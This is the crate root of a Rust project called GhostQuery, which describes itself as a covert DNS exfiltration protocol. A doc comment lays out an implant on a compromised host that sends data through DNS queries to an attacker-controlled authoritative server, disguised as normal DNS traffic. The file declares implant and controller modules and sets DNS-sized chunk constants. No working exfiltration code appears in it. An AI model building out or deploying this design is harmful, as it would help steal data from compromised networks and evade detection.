//! # GhostQuery Protocol
//!
//! An Asymmetric DNS Exfiltration Protocol Inspired by ADSM (Asymmetric Distributed Shared Memory).
//!
//! GhostQuery is a covert communication protocol that abuses the DNS hierarchy to create
//! a stealthy data-exfiltration channel. The protocol makes its traffic indistinguishable
//! from legitimate DNS traffic patterns by embracing ADSM principles.
//!
//! ## Architecture
//!
//! - **Edge Node (Implant/Writer)**: Lives on compromised host, writes data via DNS queries
//! - **Master Node (Controller/Reader)**: Authoritative DNS server, passive reader with shadow memory
//! - **DNS Hierarchy**: Acts as shared bus for data transfer
//!
//! ## Modules
//!
//! - `common`: Shared types, constants, and error handling
//! - `encoding`: Low-entropy encoding with dictionary-based substitution
//! - `crypto`: End-to-end encryption using AES-GCM
//! - `session`: Session management and state machine
//! - `protocol`: Chunking, windowing, and coherence logic
//! - `transport`: DNS and ICMP transport layers
//! - `implant`: Edge node (writer) implementation
//! - `controller`: Master node (reader) implementation

pub mod common;
pub mod crypto;
pub mod encoding;
pub mod protocol;
pub mod session;
pub mod transport;

pub mod controller;
pub mod implant;

// Re-export commonly used types
pub use common::error::{GhostQueryError, Result};
pub use common::types::{ChunkId, Command, SessionId};
pub use session::state::SessionState;

/// Protocol version
pub const VERSION: &str = env!("CARGO_PKG_VERSION");

/// Default chunk size in bytes (optimized for DNS label limits)
pub const DEFAULT_CHUNK_SIZE: usize = 32;

/// Maximum DNS label length
pub const MAX_LABEL_LENGTH: usize = 63;

/// Maximum QNAME length
pub const MAX_QNAME_LENGTH: usize = 253;

